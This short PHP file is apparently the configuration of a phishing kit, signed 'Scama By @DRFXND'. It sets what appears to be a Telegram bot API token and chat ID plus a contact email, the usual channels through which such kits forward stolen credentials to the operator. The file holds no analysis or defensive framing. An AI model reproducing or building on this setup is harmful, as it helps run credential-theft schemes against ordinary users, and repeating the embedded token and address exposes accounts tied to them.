<?php

// Scama By @DRFXND //

$api="6647942591:AAEM1v1_j8i0AS9yqAV0lNDetJiw2wLL5_M";
$chatid="5412557482";

$Email="HowardFeldstein@gmx.com";

?>